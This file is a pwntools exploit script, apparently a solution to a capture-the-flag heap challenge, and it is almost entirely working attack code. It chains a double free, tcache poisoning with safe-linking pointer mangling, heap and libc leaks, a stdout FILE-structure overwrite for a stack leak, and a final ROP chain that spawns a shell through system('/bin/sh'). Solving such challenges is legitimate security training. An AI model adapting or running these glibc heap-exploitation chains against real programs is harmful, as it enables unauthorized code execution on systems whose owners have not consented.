#!/usr/bin/env python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()

def buy(size, data):
    slna(b'> ',1)
    slna(b'Size: ',size)
    sa(b'Content: ',data)

def w(data):
    slna(b'> ',2)
    sa(b'Content: ',data)

def er():
    slna(b'> ',3)

def read():
    slna(b'> ',4)

def gen(pos, pen):
    pos = p64(pos >> 12)
    pen = p64(pen)
    return u64(xor(pos, pen))

def de(pen, ptr):
    pen = p64(pen)
    ptr = p64(ptr)
    return u64(xor(pen, ptr))

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+78
        b*main+192
        b*main+407
        b*main+488

        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # input()
        # return p


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])


#Double free
buy(512, b'abc')
er()

#For heap leak
read()
ru(b'Content: ')
leak = r(4)[:-1]
leak = leak.ljust(4,b'\0')
leak = u32(leak)
heap_base = leak << 12
info("Leak ptr: "+hex(leak))
info("Heap base: "+hex(heap_base))
w(b'0'*8+p64(0xcafef00d))
er()

# Poisoning for libc leak
fake = gen(heap_base+0x2d0, exe.sym.ptr-8)
info("Fake: "+hex(fake))
w(p64(fake))
buy(0x200, b'abc')
buy(0x200,p64(0x201)+p64(exe.got.puts))
read()
ru(b'Content: ')
lib = u64(r(6)+b'\0\0')
info("Libc leak: "+hex(lib))
libc.address = lib - 0x80ed0
info("Libc base: "+hex(libc.address))

#Double free again
buy(512, b'abc')
er()
w(b'0'*8+ p64(0xcafef00d))
er()

#Overwrite there for stdout overwrite
stdout = gen(heap_base+0x4b0,libc.address + 0x21a780)
info("Stdout: "+hex(stdout))
w(p64(stdout))

#Malloc for IO stdout overwrite
buy(512, b'\0')

#Build fake frame for shell | stack leak
lock = libc.address + 0x21ba70
vta = libc.sym._IO_wfile_jumps - 0x18
stdout = libc.sym._IO_2_1_stdout_
wdata = libc.address + 0x2199a0
adr = libc.sym.environ
sys = libc.sym.system
bis = u64(b"/bin/sh\0")
gad = libc.address + 0x0000000000163830
#Shell
# IO_file_fake = flat(
#     0x3b01010101010101,    # 0x00      0       - Ghi đè `_flags`
#     0,                     # 0x08      8       - `_IO_read_ptr`
#     sys,                     # 0x10      16      - `_IO_read_end`
#     0,                     # 0x18      24      - `_IO_read_base`
#     0,                     # 0x20      32      - `_IO_write_base`
#     bis,                     # 0x28      40      - `_IO_write_ptr`
#     0,                     # 0x30      48      - `_IO_write_end`
#     0,                     # 0x38      56      - `_IO_buf_base`
#     gad,                     # 0x40      64      - `_IO_buf_end`
#     0,                     # 0x48      72      - `_IO_save_base`
#     0,                     # 0x50      80      - `_IO_backup_base`
#     0,                     # 0x58      88      - `_IO_save_end`
#     0,                     # 0x60      96      - `_markers`
#     0,                     # 0x68      104     - `_chain`,
#     0,                     # 0x70      112     - `_flagno`
#     0,                     # 0x78      120     - `_flags2`
#     0,                     # 0x80      128     - `_old_offset`
#     lock,                  # 0x88      136     - `_lock`
#     0,                     # 0x90      144     - `_unused1`
#     stdout+168,                     # 0x98      152     - `_codecvt
#     wdata,                     # 0xa0      160     - `_wide_data`
#     stdout+24,                     # 0xa8      168     - `unknown2`
#     0,                     # 0xb0      176     - `_unused5`
#     0,                     # 0xb8      184     - `_unused6`
#     0,                     # 0xc0      192     - `_unused7`
#     0,                     # 0xc8      200     - `_unused8`
#     0,                     # 0xd0      208     - `_unused9`
#     vta,                   # 0xd8      216     - `vtable`
#     )

#For stack leak
IO_file_fake = flat(
    0xfbad1800,    # 0x00      0       - Ghi đè `_flags`
    0,                     # 0x08      8       - `_IO_read_ptr`
    0,                     # 0x10      16      - `_IO_read_end`
    0,                     # 0x18      24      - `_IO_read_base`
    adr,                     # 0x20      32      - `_IO_write_base`
    adr+8,                     # 0x28      40      - `_IO_write_ptr`
    stdout+131,                     # 0x30      48      - `_IO_write_end`
    stdout+131,                     # 0x38      56      - `_IO_buf_base`
    stdout+132,                     # 0x40      64      - `_IO_buf_end`
    # 0,                     # 0x48      72      - `_IO_save_base`
    # 0,                     # 0x50      80      - `_IO_backup_base`
    # 0,                     # 0x58      88      - `_IO_save_end`
    # 0,                     # 0x60      96      - `_markers`
    # 0,                     # 0x68      104     - `_chain`,
    # 0,                     # 0x70      112     - `_flagno`
    # 0,                     # 0x78      120     - `_flags2`
    # 0,                     # 0x80      128     - `_old_offset`
    # lock,                  # 0x88      136     - `_lock`
    # 0,                     # 0x90      144     - `_unused1`
    # 0,                     # 0x98      152     - `_codecvt
    # 0,                     # 0xa0      160     - `_wide_data`
    # 0,                     # 0xa8      168     - `unknown2`
    # 0,                     # 0xb0      176     - `_unused5`
    # 0,                     # 0xb8      184     - `_unused6`
    # 0,                     # 0xc0      192     - `_unused7`
    # 0,                     # 0xc8      200     - `_unused8`
    # 0,                     # 0xd0      208     - `_unused9`
    # vta,                   # 0xd8      216     - `vtable`
    )

#Malloc for overwriting struct for shell | for stack leak
#Stop here for shell
buy(512, IO_file_fake)

#Stack 
stack = ru(b'1')[:-3]
stack = stack.ljust(8, b'\0')
stack = u64(stack)
info("Stack leak: "+hex(stack))

#Double free 3rd
buy(512, b'abc')
er()
w(b'0'*8+ p64(0xcafef00d))
er()

stackgen = gen(heap_base+0x6c0,stack-0x178)
info("Stack gened: "+hex(stackgen))
w(p64(stackgen))
GDB()
#Malloc for overwriting stack
buy(512, b'abc')

info("Stack leak: "+hex(stack))
info("Stack gened: "+hex(stackgen))
info("Leak ptr: "+hex(leak))
info("Heap base: "+hex(heap_base))

#ROP for shell
ret = libc.address + 0x00000000000f99ab
prdi = libc.address + 0x000000000002a3e5
rop = flat(stack-0x10, 0, 0, stack-0x128, stack-0x10, ret, prdi, next(libc.search("/bin/sh\0")), sys)
buy(512, rop)
p.interactive()